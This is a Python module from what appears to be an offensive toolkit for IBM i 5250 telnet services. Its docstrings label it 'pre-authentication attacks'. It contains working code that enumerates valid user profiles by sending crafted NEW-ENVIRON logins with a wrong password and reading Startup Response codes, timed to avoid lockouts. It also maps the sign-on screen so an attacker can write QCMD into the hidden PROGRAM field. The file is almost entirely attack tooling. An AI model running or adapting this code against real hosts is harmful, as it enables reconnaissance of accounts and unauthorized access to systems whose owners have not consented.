"""
Pre-authentication attacks (Phase 3 Tier A).

A1: ConfRecEnumerator — RFC 4777 §10.4 username enumeration via
    Startup Response Record codes. Standalone TCP connections,
    NOT through the proxy.
A3: QDSignonTamperer — discover screen positions of QDSIGNON's
    fixed-layout buffer slots so we can SBA-write to PROGRAM
    even when it's DSPATR(ND) hidden.

A2 (IBMPROGRAM/IBMIMENU/IBMCURLIB injection) lives in
TN5250.negotiate_hook() — it has to splice the live proxy stream.
"""
import logging
import socket
import time
from typing import Optional

from hackterm_core import Screen

from hack5250.constants import (
    NE_USERVAR, NE_VALUE, NE_IS,
    USERVAR_USER, USERVAR_IBMSUBSPW, USERVAR_IBMSENDCONFREC,
    IAC, SB, SE, TELOPT_NEW_ENVIRON,
)

_log = logging.getLogger(__name__)


# === A3: QDSIGNON buffer layout =============================================
#
# IBM mandates: don't delete fields, don't reorder, don't change lengths.
# (Source: SC41-5407 Display File Reference.) The 178-byte buffer:
#
#   Slot      Offset  Length
#   USERID    1       10
#   PASSWRD   11      10
#   PROGRAM   21      10      ← attack target — write QCMD here
#   MENU      31      10
#   CURLIB    41      10
#   UBUFFER   51      128
#
# Screen ROW/COL positions vary by DDS variant. Buffer offsets do not.
# Input fields appear on screen in buffer order — that's how we map.

QDSIGNON_BUFFER_LAYOUT: list[tuple[str, int]] = [
    ("USERID",  10),
    ("PASSWRD", 10),
    ("PROGRAM", 10),
    ("MENU",    10),
    ("CURLIB",  10),
    ("UBUFFER", 128),
]


class QDSignonTamperer:
    """Map QDSIGNON screen positions to buffer slots.

    Discover positions by parsing the sign-on screen — input fields
    appear in buffer order. zip() with the layout. position_of("PROGRAM")
    then tells you where to SBA-write, even if the field is NONDISP.

    Usage:
        screen = proto.parse(captured_signon_packet)
        t = QDSignonTamperer(screen)
        prog_pos = t.position_of("PROGRAM")  # → (row, col) or None
        # Now: send_fields([..., FieldWrite(*prog_pos, b"QCMD      ")])
    """

    def __init__(self, signon_screen: Screen):
        # Filter to input (unprotected) fields, sort by screen position.
        # Output-only labels (protected=True) don't occupy buffer slots.
        inputs = sorted(
            (f for f in signon_screen.fields if not f.protected),
            key=lambda f: (f.row, f.col),
        )
        # zip stops at the shorter sequence — partial sign-ons (just
        # USERID+PASSWRD) map fine, extra slots stay unmapped.
        self.field_positions: dict[str, tuple[int, int]] = {
            name: (field.row, field.col)
            for (name, _length), field in zip(QDSIGNON_BUFFER_LAYOUT, inputs)
        }

    def position_of(self, field_name: str) -> Optional[tuple[int, int]]:
        """Where is this slot on the current sign-on variant?
        None if the variant doesn't expose it."""
        return self.field_positions.get(field_name)


# === A1: ConfRecEnumerator ==================================================
#
# RFC 4777 §10.4 — Startup Response Record codes.
# 4 EBCDIC digits at offset 12-15 in the 17-byte record. Record marked
# by 0x12A0 (GDS type) at offset 2-3. We locate the marker, then read
# marker+10 — handles confrecs embedded in larger telnet streams.

CONFREC_CODES: dict[bytes, tuple[str, str]] = {
    b"\xf0\xf0\xf0\xf1": ("success",      "Authenticated (unexpected — password was right)"),
    b"\xf0\xf0\xf0\xf2": ("not_found",    "User profile does not exist"),
    b"\xf0\xf0\xf0\xf3": ("disabled",     "User profile is disabled"),
    b"\xf0\xf0\xf0\xf4": ("bad_password", "User exists, password wrong"),
    b"\xf0\xf0\xf0\xf6": ("expired",      "User exists, password expired"),
    b"\xf0\xf0\xf0\xf8": ("warn_revoke",  "User exists, next failure revokes"),
}

# The GDS marker that identifies a Startup Response Record in the stream.
_CONFREC_MARKER = bytes([0x12, 0xA0])
# Code is at record offset 12; marker is at record offset 2 → delta 10.
_CONFREC_CODE_OFFSET_FROM_MARKER = 10


class ConfRecEnumerator:
    """RFC 4777 §10.4 username enumeration via Startup Response codes.

    Workflow per probe:
      1. Open a fresh TCP connection (NOT through the proxy — recon).
      2. Send NEW-ENVIRON IS with USER + garbage IBMSUBSPW + IBMSENDCONFREC=YES.
      3. Read the Startup Response Record.
      4. Find the 0x12A0 marker, extract the 4-byte code at marker+10.
      5. Classify via CONFREC_CODES, store, close.

    Rate-limited. The host TELLS us (warn_revoke) before it would lock
    anyone out — that's the whole reason this oracle is so clean.
    """

    def __init__(self, host: str, port: int,
                 garbage_password: str = "WRONGPW1",
                 timeout: float = 5.0):
        self.host = host
        self.port = port
        self.garbage_password = garbage_password
        self.timeout = timeout
        self.results: dict[str, tuple[str, str]] = {}
        self.rate_limit_sec = 0.5

    # --- pure helpers (no I/O) ----------------------------------------

    def _build_environ(self, username: str) -> bytes:
        """Build the inner NEW-ENVIRON payload (without IAC SB...IAC SE
        wrapping — probe() adds that). USERVAR/VALUE pairs in ASCII."""
        return (
            bytes([NE_USERVAR]) + USERVAR_USER +
            bytes([NE_VALUE]) + username.upper().encode("ascii") +
            bytes([NE_USERVAR]) + USERVAR_IBMSUBSPW +
            bytes([NE_VALUE]) + self.garbage_password.encode("ascii") +
            bytes([NE_USERVAR]) + USERVAR_IBMSENDCONFREC +
            bytes([NE_VALUE]) + b"YES"
        )

    def _classify_confrec(self, data: bytes) -> tuple[str, str]:
        """Find the 0x12A0 marker, extract the 4-byte code at marker+10,
        look up in CONFREC_CODES. Returns ("unknown", hex) on miss."""
        m = data.find(_CONFREC_MARKER)
        if m == -1:
            return ("no_confrec", "No 0x12A0 marker in response")
        code_start = m + _CONFREC_CODE_OFFSET_FROM_MARKER
        code = data[code_start:code_start + 4]
        if len(code) < 4:
            return ("truncated", f"Response too short (got {len(code)} of 4)")
        return CONFREC_CODES.get(code, ("unknown", f"Unrecognized code {code.hex()}"))

    # --- network probe ------------------------------------------------

    def probe(self, username: str) -> tuple[str, str]:
        """Single probe: connect → send environ → recv → classify.
        Stores result in self.results[username] before returning."""
        env = self._build_environ(username)
        # Wrap in IAC SB NEW-ENVIRON IS ... IAC SE
        subneg = (bytes([IAC, SB, TELOPT_NEW_ENVIRON, NE_IS]) + env +
                  bytes([IAC, SE]))

        sock = socket.create_connection((self.host, self.port),
                                        timeout=self.timeout)
        try:
            sock.settimeout(self.timeout)
            sock.sendall(subneg)
            # Read until we see the marker or hit timeout. Real IBM i
            # may send telnet handshake bytes first — accumulate.
            buf = b""
            while _CONFREC_MARKER not in buf and len(buf) < 4096:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                buf += chunk
            result = self._classify_confrec(buf)
        finally:
            sock.close()

        self.results[username] = result
        _log.info("ConfRec probe %s → %s", username, result[0])
        return result

    def enumerate(self, wordlist: list[str],
                  stop_on_revoke_warn: bool = True) -> None:
        """Iterate wordlist with rate limiting. Skips usernames that
        already returned warn_revoke (don't trigger the lockout)."""
        for user in wordlist:
            if user in self.results and self.results[user][0] == "warn_revoke":
                if stop_on_revoke_warn:
                    continue
            try:
                self.probe(user)
            except OSError as e:  # covers timeout, ConnectionError, EHOSTUNREACH
                self.results[user] = ("error", str(e))
                _log.warning("Probe %s failed: %s", user, e)
            time.sleep(self.rate_limit_sec)

    @property
    def existing_users(self) -> list[str]:
        """Users that exist on the system (anything except not_found)."""
        return [u for u, (c, _) in self.results.items()
                if c != "not_found"]
